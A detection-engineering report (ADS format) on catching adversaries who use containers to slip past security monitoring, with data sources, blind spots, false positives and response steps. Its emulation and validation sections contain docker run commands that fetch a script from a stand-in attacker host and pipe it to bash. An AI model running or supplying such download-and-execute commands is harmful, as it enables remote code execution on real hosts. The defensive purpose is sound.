# Alerting & Detection Strategy (ADS) Report

## Goal
The objective of this detection technique is to identify adversarial attempts to bypass security monitoring systems by leveraging container technology. Containers are increasingly used by adversaries due to their ability to encapsulate environments, making malicious activities harder to detect.

## Categorization

## Strategy Abstract
This detection strategy focuses on monitoring and analyzing container activities across multiple platforms to identify unauthorized or suspicious behaviors. The primary data sources include:

- Container orchestration logs (e.g., Kubernetes, Docker)
- Network traffic patterns within containers
- System-level event logs from the host operating system

The analysis involves identifying anomalous patterns such as unexpected network connections originating from containers, unusual configurations in container runtimes, and unauthorized image pull activities.

## Technical Context
Adversaries exploit containers to conceal malicious operations by mimicking legitimate applications or services. Common tactics include:

- **Container Image Tampering:** Malicious actors modify existing images or create new ones with embedded malware.
- **Orchestration Manipulation:** By exploiting container orchestration tools, adversaries can gain control over container deployment and scaling processes.

Adversary emulation involves creating test scenarios where containers are used to execute commands remotely or access sensitive data. For example:

```bash
docker run -d --name adversary_container malicious_image /bin/bash -c "curl http://attacker-server.com/malicious_payload.sh | bash"
```

This command emulates an attacker pulling a compromised image and executing a remote script.

## Blind Spots and Assumptions

- **Blind Spots:**
  - Detection might miss sophisticated attacks using legitimate container configurations.
  - Encrypted network traffic within containers may not be analyzed effectively without decryption capabilities.

- **Assumptions:**
  - Assumes that all container activities are logged with sufficient detail for analysis.
  - Relies on baseline knowledge of normal container behavior to identify anomalies.

## False Positives
Potential benign activities that might trigger false alerts include:

- Legitimate use of containers by developers for rapid prototyping or testing purposes.
- Automated deployments and scaling operations in a microservices architecture.
- Network scanning tools running within development environments.

## Priority
**Severity:** High

**Justification:** The use of containers to bypass security monitoring presents a significant risk due to their ability to encapsulate and conceal malicious activities, potentially allowing adversaries persistent access to the environment.

## Validation (Adversary Emulation)

### Step-by-Step Instructions

1. **Setup Test Environment:**
   - Deploy a container orchestration platform like Kubernetes or Docker Swarm.
   - Configure logging for container activities and network traffic.

2. **Create Malicious Container Image:**
   - Use an existing image as a base.
   - Embed a script that connects to an external server upon execution.

3. **Deploy the Malicious Container:**
   ```bash
   docker run -d --name test_container malicious_image /bin/bash -c "curl http://test-server.com/malicious_payload.sh | bash"
   ```

4. **Monitor Logs and Network Traffic:**
   - Analyze logs for unexpected network connections or unauthorized image pulls.
   - Observe any deviations from normal container behavior.

## Response
When an alert is triggered, analysts should:

1. **Isolate the Container:** Immediately isolate the affected container to prevent further communication with external servers.
2. **Analyze Logs:** Review detailed logs of the container's activities and network traffic for signs of malicious behavior.
3. **Investigate Host System:** Check the host system for any signs of compromise or unauthorized access.
4. **Update Security Measures:** Enhance security controls, such as implementing stricter image scanning policies and improving network segmentation.
